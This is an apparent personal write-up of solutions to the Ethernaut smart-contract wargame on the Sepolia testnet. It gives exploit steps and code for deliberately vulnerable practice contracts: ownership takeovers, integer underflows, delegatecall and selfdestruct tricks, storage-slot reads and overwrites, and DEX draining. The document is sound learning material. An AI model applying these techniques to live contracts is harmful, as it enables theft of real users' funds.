# Ethernaut

- [Problem Set](https://ethernaut.openzeppelin.com/)
- player: [0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7](https://sepolia.etherscan.io/address/0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7)
- Sepolia Network
- `_ethers.version` == **5.7.2**


## Problem 1: Fallback

contract addr: [0x119fBFcF1b46DcCB3EEae3f40A06bf29f79e3d57](https://sepolia.etherscan.io/address/0x119fBFcF1b46DcCB3EEae3f40A06bf29f79e3d57)

**Solution**

1. Run:
   ```ts
   await contract.contribute({value: _ethers.utils.parseEther("0.0001") })
   ```
   - you are not allowed to contribute 0.001 ether or more to the contract

2. Send 0.0001 tokens to your practice contract from wallet

   - you have became the owner by this point.

3. Run:
   ```ts
   await contract.withdraw()
   ```

4. Submit the contract

Note: beware the max gas limit restricted on Sepolia that metamask won't automatically detect.

## Problem 2: Fallout

contract addr: [0x25d51fC62EfE411ffe273434D1aE20a1a513022d](https://sepolia.etherscan.io/address/0x25d51fC62EfE411ffe273434D1aE20a1a513022d)

**Solution**

1. Run:

   ```ts
   await contract.Fal1out()
   ```

   Everyone can call this function and claim the ownership of the contract

## Problem 3: Coin Flip

- **CoinFlip** contract addr: [0xFb9BcE79EbE63c7551A9EB856b03Eb9E56742dCb](https://sepolia.etherscan.io/address/0xFb9BcE79EbE63c7551A9EB856b03Eb9E56742dCb)
- **SolveCoinFlip** contract addr: [0x8A7BC0BBD97bcDeAf5456E42259e191Fc761A176](https://eth-sepolia.blockscout.com/address/0x8A7BC0BBD97bcDeAf5456E42259e191Fc761A176)
- You can't use typescript js to do this. You need to deploy a contract to attack this contract

## Problem 4: Telephone

- **Telephone** contract addr: [0x92385004C0Af2AE55764d9DD34e747971B4CEb2D](https://sepolia.etherscan.io/address/0x92385004C0Af2AE55764d9DD34e747971B4CEb2D)
- **SolveTelephone** contract addr: [0x399981F8FB9398378a5f9D2E4713dfed803e2a10](https://sepolia.etherscan.io/address/0x399981F8FB9398378a5f9D2E4713dfed803e2a10)

## Problem 5: Token

- contract address: [0xb727dec88DA19d791ac27A287448f86D802648F5](https://sepolia.etherscan.io/address/0xb727dec88DA19d791ac27A287448f86D802648F5)

- player: 0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7
- another one: 0x9440Abf16a3319E633DA6835d90470ed029D7c0B

**Solution**

- There is an underflow behavior in the smart contract.
- Just transfer any value larger than 20, it will still pass through the `require(balances[msg.sender] - _value >= 0)` test.

## Problem 6: Delegation

- contract address: [0x344fCaCD370F420d79D5f9f6B74d86Cc1bB05383](https://eth-sepolia.blockscout.com/address/0x344fCaCD370F420d79D5f9f6B74d86Cc1bB05383)

**Solution**

- construct the calldata by:

  ```ts
  const abi = ["function pwn()"];
  const iface = new _ethers.utils.Interface(abi);
  let data = iface.encodeFunctionData("pwn");
  data;
  // display: `0xdd365b8b`
  ```
- send a transaction from metamask wallet to the contract address with the above data.

- note on parity hack:
   https://www.openzeppelin.com/news/on-the-parity-wallet-multisig-hack-405a8c12e8f7

## Problem 7: Force

- Force contract: [0x7Bf28C183F18aFD22857951B21149D8833A1A7c3](https://eth-sepolia.blockscout.com/address/0x7Bf28C183F18aFD22857951B21149D8833A1A7c3)
- ForceTransfer contract: [0x6BA6Af3195dea194aF63C408691ae336A54AdB51](https://eth-sepolia.blockscout.com/address/0x6BA6Af3195dea194aF63C408691ae336A54AdB51)

- Without a `receive() payable` and `fallback() payable`, a contract doesn't take a native token transfer. It will be reverted.
- But you can **selfdestruct** another contract, and that contract will send all remaining ETH to the beneficiary contract.

   ```sol
   // SPDX-License-Identifier: MIT
   pragma solidity ^0.8.0;

   contract ForceSender {
       constructor() payable {}          // fund this contract on deployment
       receive() external payable {}     // or fund later

       function forceSend(address payable target) external {
           selfdestruct(target);         // sends all ETH to target, no fallback/receive called
       }
   }
   ```

- To use metamask as the provider connecting to the blockchain in ethers.js

   ```ts
   // 1) Wrap window.ethereum
   const provider = new _ethers.providers.Web3Provider(window.ethereum);
   ```

## Problem 8: Vault

- Vault addr: [0x50D9a4Aa381dca1B7a0E36523D0A49D668dED769](https://sepolia.etherscan.io/address/0x50D9a4Aa381dca1B7a0E36523D0A49D668dED769)
- How can you view private storage in deployed smart contract?
  **YES you can**, by directly reading the storage slot, using `provider.getStorageAt()`

## Problem 9: King

- King contract: [0x2EF61D5357a8c6d05D9346FE46A49540924aaeD3](https://eth-sepolia.blockscout.com/address/0x2EF61D5357a8c6d05D9346FE46A49540924aaeD3)
- SolveKing contract: [0x37Ec18964BcB3B8702cCCC039268E2F9c9578959](https://eth-sepolia.blockscout.com/address/0x37Ec18964BcB3B8702cCCC039268E2F9c9578959)

**Solution**

- you want to deploy a contract, transfer value, so the smart contract become the king. The smart contract has to revert() inside the `receive()` function so `transfer()` from the caller would fail.

## Problem 10: Re-entrancy

- Reentrance contract: [0x282A05d379B06492bE2ae7717f46949baE4a89b4](https://eth-sepolia.blockscout.com/address/0x282A05d379B06492bE2ae7717f46949baE4a89b4)
- SolveReentrance contract: [0x5e906767e9a29560c11E8797AF5727c1AC9c5472](https://eth-sepolia.blockscout.com/address/0x5e906767e9a29560c11E8797AF5727c1AC9c5472)

## Problem 11: Elevator

- Elevator contract: [0xab4F955b7850317927183490267D732B4f43d053](https://eth-sepolia.blockscout.com/address/0xab4F955b7850317927183490267D732B4f43d053)

- SolveElevator contract: [0xcc57eDeF112544A043a6d868aeccCFd189026150](https://eth-sepolia.blockscout.com/address/0xcc57eDeF112544A043a6d868aeccCFd189026150)

## Problem 12: Privacy

- Privacy contract: [0x6eAF72dfE1F9128693905415F053B2bBEC4cB8BE](https://eth-sepolia.blockscout.com/address/0x6eAF72dfE1F9128693905415F053B2bBEC4cB8BE)

**Solution**

- To read `data[2]` it is at storage slot 5
- storage slot 5 is: `0x675f4672e6c547e6ff949be945aac6022678602fb605a537270c9d15ec6e62f8`
- We want bytes16, the first 16 bytes. So we call unlock() with parameter: `0x675f4672e6c547e6ff949be945aac602`.

## Problem 13: Gatekeeper One

- GatekeeperOne contract: [0x7d9a313e1A8b4741602EFea881Cdd31BFF15E1bd](https://eth-sepolia.blockscout.com/address/0x7d9a313e1A8b4741602EFea881Cdd31BFF15E1bd)

- SolveGatekeeperOne contract: [0x641b1c10D8cd899aAD701426D97Ed96eA893Eac6](https://eth-sepolia.blockscout.com/address/0x641b1c10D8cd899aAD701426D97Ed96eA893Eac6)

**Solution**

- tx.origin: **0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7**
- input: **0x00009cA700009cA7**
- txhash: [0x05d94fd106e86d2d85ce495669131459d46781256b21cb4dfc1374571fb8d193](https://eth-sepolia.blockscout.com/tx/0x05d94fd106e86d2d85ce495669131459d46781256b21cb4dfc1374571fb8d193)

## Problem 14: Gatekeeper Two

- GatekeeperTwo contract: [0x805Dfa3BBb4A45b4475643969F5A20a366C130CA](https://eth-sepolia.blockscout.com/address/0x805Dfa3BBb4A45b4475643969F5A20a366C130CA)

- SolveGatekeeperTwo contract: [0xb3E792498C9e05fE4ADdfFd8239064E99c378949](https://eth-sepolia.blockscout.com/address/0xb3E792498C9e05fE4ADdfFd8239064E99c378949)

## Problem 15: Naught Coin

- NaughtCoin contract: [0x0fCca0985F3f8dB96D0A715d261C9222028c2F25](https://eth-sepolia.blockscout.com/address/0x0fCca0985F3f8dB96D0A715d261C9222028c2F25)

**Solution**

- Even though `transfer()` is gated with **lockTokens** check, `transferFrom()` is not.

- So in Chrome dev console, execute the following:

   ```ts
   let tx = await contract.approve(player, '1000000000000000000000000')
   let tx2 = await contract.transferFrom(player, "0xb3E792498C9e05fE4ADdfFd8239064E99c378949", '1000000000000000000000000')
   ```

## Problem 16: Preservation

- Preservation contract: [0x85437951906b0333Be9156bf1c415FA1d55AA90e](https://eth-sepolia.blockscout.com/address/0x85437951906b0333Be9156bf1c415FA1d55AA90e)

- SolvePreservation contract: [0x261AA8EAC6642b3f7B50Da50f42a39b7324931e2](https://eth-sepolia.blockscout.com/address/0x261AA8EAC6642b3f7B50Da50f42a39b7324931e2)

**Solution**

- Run in dev console

   ```ts
   let addrNum = _ethers.BigNumber.from("0x261AA8EAC6642b3f7B50Da50f42a39b7324931e2")
   addrNum.toString()
   // display: 217536183420285343367994901537296371963644162530

   // Afterward, run (yes, twice)
   await contract.setFirstTime("217536183420285343367994901537296371963644162530")
   await contract.setFirstTime("217536183420285343367994901537296371963644162530")
   ```

- Refer to txHash: [0xbf0291794ccfd65b519f2081c1ef0ee969e2d699d2d9bf41a57dcb871fba3dbd](https://sepolia.etherscan.io/tx/0xbf0291794ccfd65b519f2081c1ef0ee969e2d699d2d9bf41a57dcb871fba3dbd)

In etherscan, when viewing a txHash, looking over **State**, you can see which storage slot a tx has updated.

## Problem 17: Recovery

- Recovery contract: [0x499BBe67c781e73762EcecC7Cbb082043639a053](https://eth-sepolia.blockscout.com/address/0x499BBe67c781e73762EcecC7Cbb082043639a053)

**Solution**

- Reviewing the contract [internal txns](https://eth-sepolia.blockscout.com/address/0x499BBe67c781e73762EcecC7Cbb082043639a053?tab=internal_txns), it has created the SimpleToken contract at [0xfee6656D854B4a27777F98e68bbBA12C66F70B14](https://eth-sepolia.blockscout.com/address/0xfee6656D854B4a27777F98e68bbBA12C66F70B14).

- Copy the **SimpleToken** code in etherscan
- Load up the contract at the above address: **0xfee6656D854B4a27777F98e68bbBA12C66F70B14**.
- Call **destroy()**

## Problem 18: Magic Number

- MagicNum contract: [0x0465E8AaF6E1fbcC756E7dbAD8eD8E1509409068](https://eth-sepolia.blockscout.com/address/0x0465E8AaF6E1fbcC756E7dbAD8eD8E1509409068)

- Deployed contract: [0xfcFa5d641285952B4f71564c5BC4952b370B7594](https://eth-sepolia.blockscout.com/address/0xfcFa5d641285952B4f71564c5BC4952b370B7594)

Ref:
- AI ans: https://www.perplexity.ai/search/the-ethernaut-G1EIbK15TA.3qnWN4q53sA#29
- How to deploy raw bytecode to the EVM: https://ardislu.dev/raw-bytecode-evm

**Solution**

- Learn about what the byte code means

- Runtime code:
  ```
  60 2A  - push 42
  60 00  - push 0
  52     - MSTORE
  60 20  - push 32
  60 00  - push 0
  F3     - RETURN
  ```

  So the full deployed bytecode: 602A60005260206000F3

- Creation code:
  ```
  600a600c600039600a6000f3
  ```

- Full bytecode with creation code:
  ```
  600a600c600039600a6000f3602A60005260206000F3
  ```

- Deploy the bytes code on Sepolia

  ```ts
  let provider = _ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();
  let tx = await signer.sendTransaction({ data: "0x600a600c600039600a6000f3602A60005260206000F3" });

  // Find the deployed contract address from the returned txHash
  await contract.setSolver("0xfcFa5d641285952B4f71564c5BC4952b370B7594");
  ```

## Problem 19: Alien Codex

- AlienCodex contract: [0x3F223FD13b35731eD43D8C38548aBdd2e0B3eCae](https://eth-sepolia.blockscout.com/address/0x3F223FD13b35731eD43D8C38548aBdd2e0B3eCae)

**Solution**

- The insight is the storage layout is
   ```sol
   address private owner   // 20-byte storage slot 0
   bool public contact     // 1-byte storage slot 0
   bytes32[] public codex  // its len is 32-byte storage slot 1
   ```

   The content of the first element of codex is stored at `keccak256("0x0000000000000000000000000000000000000000000000000000000000000001")`, which is **0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6**.

- Call retract(), so its codex length underflow and become 0xffff.., allow accessing all storage.
   ```ts
   await contract.retract()
   ```

- We calculate from the content location `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`, if we access codex **35707666377435648211887908874984608119992236509074197713628505308453184860938**th element (by `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff` - `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6` + 1), we are writing back to storage slot 0x0000000000000000000000000000000000000000000000000000000000000000.
   ```ts
   await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', "0x000000000000000000000000B0fD5a878DBF3F9358A251caF9b6Fc692A999cA7");
   ```

## Problem 20: Denial

- Denial contract: [0x47b6719d71f7B6Bf6D9234Ca8f3C31bFa328357A](https://eth-sepolia.blockscout.com/address/0x47b6719d71f7B6Bf6D9234Ca8f3C31bFa328357A)

- SolveDenial contract: [0x73E201be2A7e6695Ee81958E8172bd559c52Dc98](https://eth-sepolia.blockscout.com/address/0x73E201be2A7e6695Ee81958E8172bd559c52Dc98)

**Learning**

The attack is called gas grieving - depleting all the transaction gas.

If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example `<Address>.call{gas: <gasAmount>}(data)`. Typically one should follow the [checks-effects-interactions](https://docs.soliditylang.org/en/v0.8.33/security-considerations.html#reentrancy) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.

## Problem 21: Shop

- Shop contract: [0x4f6cF5291B7da082657b6237AAf16d177AEfabd7](https://eth-sepolia.blockscout.com/address/0x4f6cF5291B7da082657b6237AAf16d177AEfabd7)

- SolveShop contract: [0x628Bda7Ea5632E928CE364b91FE60927D697646f](https://sepolia.etherscan.io/address/0x628Bda7Ea5632E928CE364b91FE60927D697646f)

**Learning**

The learning is that even though the called contract is restricted to be a view function. It can still read other contracts and rely on external contract states, and make it behave like a function that depend on varying states.

## Problem 22: Dex

- Dex contract: [0x2fc8d823E95Ad23514373175Bfbf16a9d20Acc72](https://eth-sepolia.blockscout.com/address/0x2fc8d823E95Ad23514373175Bfbf16a9d20Acc72)

**Solution**

- If you keep swapping one token all the way to another token, you will incrementally making additional profit because of the division in **getSwapPrice()** that it performs.
- Keep swapping from one token to the other, back and forth, until you drain the DEX. On the last swap, you have to compute the exact amount so you don't retrieve more tokens than what the DEX has.

## Problem 23: Dex Two

- DexTwo contract: [0xd8CF74d217A2b6744Eec1aEB8234B8Dca76B3c4c](https://eth-sepolia.blockscout.com/address/0xd8CF74d217A2b6744Eec1aEB8234B8Dca76B3c4c)

- MyToken contract: [0x5AdB7917691d375B7a1ea1E8C12B4AC38Ca75c69](https://eth-sepolia.blockscout.com/address/0x5AdB7917691d375B7a1ea1E8C12B4AC38Ca75c69)

**Solution**

- Deploy the MyToken contract and mint yourself **4** MyTokens.
- Transfer **1** MyToken from your own account to the DEX.
- Swap your own **1** MyToken to `token1` with the DEX (100% of MyToken).
- Swap your own **2** MyToken to `token2` with the DEX (100% of MyToken).
- By this point, all `token1` and `token2` have been depleted from the DEX. Submit the solution.
